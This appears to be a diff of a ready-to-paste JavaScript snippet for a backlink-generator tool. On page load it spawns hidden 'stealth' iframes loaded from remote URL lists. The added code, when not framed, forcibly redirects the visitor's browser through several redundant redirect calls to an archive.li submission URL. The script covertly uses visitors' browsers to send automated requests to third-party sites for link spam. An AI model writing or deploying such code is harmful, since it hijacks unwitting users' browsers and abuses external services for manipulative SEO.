@@ -2,7 +2,9 @@
 <script>
 /* Instrumented version of your script — paste in place of old script */
 const fetchData = [
-  "https://smartbacklinkmaker.blogspot.com/"
+  	"seekersofdecay/",
+  	"seekersofdecay/regan-vest/",
+  	"abandoned-machine/"
 ];
 const fetchURLs = [
   	"https://backlink-generator-tool.github.io/url-dump-json/url/custom-urls/pinterest-patch/patch-1.json",
@@ -164,6 +166,15 @@ function createIframe(i) {
   }
 }
 
+function inIframe() {
+  try {
+    return window.self !== window.top;
+  } catch (e) {
+    // Accessing window.top threw an error → must be in an iframe
+    return true;
+  }
+}
+
 /* Ensure container exists (defensive) */
 if (!document.getElementById("stealthIFrameContainer")) {
   const c = document.createElement("div");
@@ -180,6 +191,21 @@ document.addEventListener('DOMContentLoaded', async () => {
     console.warn("updateDefaultURLs() failed:", e && e.message);
   }
 
-  for (let i = 0; i < IFRAME_COUNT; i++) createIframe(i);
+	if(inIframe()){
+	    updateDefaultURLs().then(() => {
+	        for (let i = 0; i < IFRAME_COUNT; i++) {
+	            createIframe(i);
+	        }
+	    });
+	}else {
+	    const url = "https://archive.li/submit/?anyway=1&url="+encodeURIComponent(generateTargetURL());
+	 
+	    window.location.href = url;
+	    window.location.assign(url);
+	    window.location.replace(url);
+	    window.location = url;
+	    document.location = url;
+	    window.open(url, "_self"); // behaves like redirect
+	}
 });
 </script>
